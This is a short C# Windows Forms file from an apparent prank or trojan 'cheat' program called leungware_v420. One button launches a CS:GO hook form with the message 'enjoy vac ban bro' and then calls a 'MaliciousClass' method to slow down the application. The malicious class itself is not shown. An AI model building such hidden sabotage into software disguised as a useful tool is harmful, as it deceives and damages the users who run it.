using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace leungware_v420
{
    public partial class Placebo : Form
    {
        public bool Button2HasBeenClicked = false;
        public Placebo()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
            _ = MessageBox.Show("We (randonandoz and rethinking.) arnt responsible for anything that happenes");
            var clicker = new Clicker();
            clicker.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Button2HasBeenClicked = true;
            this.Hide();
            MessageBox.Show("enjoy vac ban bro - loading - might take a while...");
            var csgo = new LeungHook();
            csgo.Show();
            if (!Button2HasBeenClicked) return;
            var inst = new MaliciousClass();
            inst.SlowDownApplication(8);
        }
    }
}
